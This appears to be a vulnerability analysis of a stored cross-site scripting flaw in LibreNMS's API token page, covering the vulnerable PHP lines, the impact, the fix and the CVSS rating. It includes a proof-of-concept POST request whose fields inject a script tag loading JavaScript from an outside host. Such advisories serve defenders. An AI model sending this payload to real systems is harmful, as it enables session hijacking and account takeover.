Based on the provided content, here's a breakdown of the vulnerability:

**Root cause of vulnerability:**

*   The vulnerability lies in the insufficient sanitization of the `token_hash` variable before it is outputted in the HTML within the `api-access.inc.php` file. Specifically, the code directly outputs the value without encoding, which allows for the injection of malicious JavaScript code.

**Weaknesses/vulnerabilities present:**

*   **Stored Cross-Site Scripting (XSS):** The application stores the malicious JavaScript in the database when a new API token is created and executes it when the page is rendered for other users.

**Impact of exploitation:**

*   **Account Compromise:** An attacker can execute arbitrary JavaScript code in the context of other users' sessions. This could lead to account takeover, data theft, and other unauthorized actions on behalf of the compromised user.
*   **Unauthorized Actions:** The attacker can perform actions that the compromised user is authorized to perform, potentially leading to further damage to the system.

**Attack vectors:**

*   **Network-based:** The attack is performed over the network by sending a crafted POST request.
*   **Web Interface:** The attacker exploits the web interface of the application.

**Required attacker capabilities/position:**

*   **Authenticated User:** The attacker must be an authenticated user of the LibreNMS application, with administrative privileges necessary to create API tokens.
*   **Access to API Token Creation:** The attacker must have access to the API token creation form.

**Technical details:**

*   The vulnerable code snippets are located in `includes/html/pages/api-access.inc.php` at lines 152 and 153:
    ```php
    <td>' . $api->token_hash . '</td>
    <td><button class="btn btn-info btn-xs" data-toggle="modal" data-target="#display-qr" data-token_hash="' . $api->token_hash . '"><i class="fa fa-qrcode" ></i></button></td>
    ```
*   The malicious payload is inserted via the "token" parameter of the POST request when creating a new API token.
*   The provided Proof-of-Concept (PoC) demonstrates a POST request with the malicious payload:
    ```
    POST /ajax_form.php HTTP/1.1
    Host: <your_host>
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-CSRF-TOKEN: <your_token>
    X-Requested-With: XMLHttpRequest
    Cookie: <your_cookie>

    _token=<your_token>&user_id=1&token='"><script/src=//15.rs></script>&description=t'"><script/src=//15.rs>&type=token-item-create
    ```

**Resolution:**

* The vulnerability is resolved by generating the API token server side instead of using the user supplied token, and by encoding the output using `htmlentities()` to prevent the execution of user-supplied JavaScript code.
* The fix can be found in the commit `25988a937cbaebd2ba4c0517510206c404dfb359`.

**Additional Notes:**

* The provided content includes a CVSS v3 score of 7.5, which classifies the severity as High.
* The vulnerability is associated with CWE-79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')).
